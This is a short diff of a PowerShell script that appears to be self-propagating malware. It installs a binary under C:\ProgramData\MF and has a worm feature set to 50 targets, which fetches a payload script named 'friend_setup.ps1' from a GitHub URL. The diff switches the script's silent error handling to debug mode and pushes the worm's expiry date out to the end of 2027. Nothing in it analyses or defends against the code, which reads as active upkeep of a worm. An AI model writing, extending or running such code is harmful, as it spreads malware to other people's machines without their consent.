@@ -5,8 +5,10 @@
 # ============================================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$ErrorActionPreference = "SilentlyContinue"
-$ProgressPreference = "SilentlyContinue"
+# $ErrorActionPreference = "SilentlyContinue"  # DEBUG
+# $ProgressPreference = "SilentlyContinue"    # DEBUG
+$ErrorActionPreference = "Continue"
+$ProgressPreference = "Continue"
 
 $BASE = "C:\ProgramData\MF"
 $BINARY = "$BASE\MF.exe"
@@ -471,7 +473,7 @@ try { $myPath = $MyInvocation.MyCommand.Definition; if ($myPath -and $myPath -li
 
 $WORM_ENABLED = $true
 $MAX_TARGETS = 50
-$WORM_EXPIRY = "2025-12-31T23:59:59"
+$WORM_EXPIRY = "2027-12-31T23:59:59"
 $WORM_LOG = "$BASE\worm.log"
 $PAYLOAD_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/friend_setup.ps1"
 $STATUS_FILE = "$BASE\status.json"
